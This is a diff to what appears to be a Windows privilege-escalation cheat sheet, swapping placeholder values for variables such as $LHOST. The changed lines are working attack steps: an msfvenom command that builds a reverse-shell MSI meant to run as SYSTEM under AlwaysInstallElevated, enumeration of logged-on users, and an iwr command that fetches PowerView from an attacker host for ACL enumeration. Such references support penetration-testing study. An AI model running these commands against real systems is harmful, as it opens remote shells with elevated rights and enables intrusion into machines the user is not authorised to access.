@@ -76,7 +76,7 @@ Both must be `0x1`. If set, any `.msi` runs as SYSTEM:
 
 ```bash
 # On attacker
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi -o shell.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o shell.msi
 ```
 
 ```cmd
@@ -107,7 +107,7 @@ See [Service Exploitation](service-exploitation.md) for unquoted paths, weak ser
 ```cmd
 query user
 net session
-quser /server:10.10.10.10
+quser /server:$IP
 ```
 
 ---
@@ -117,7 +117,7 @@ quser /server:10.10.10.10
 PowerView is part of PowerSploit, must be imported first. The cmdlets below don't exist in stock PowerShell:
 
 ```powershell
-iwr -uri http://<attacker-ip>/PowerView.ps1 -OutFile PowerView.ps1
+iwr -uri http://$LHOST/PowerView.ps1 -OutFile PowerView.ps1
 . .\PowerView.ps1
 
 Get-DomainObjectAcl -Identity <user> -ResolveGUIDs
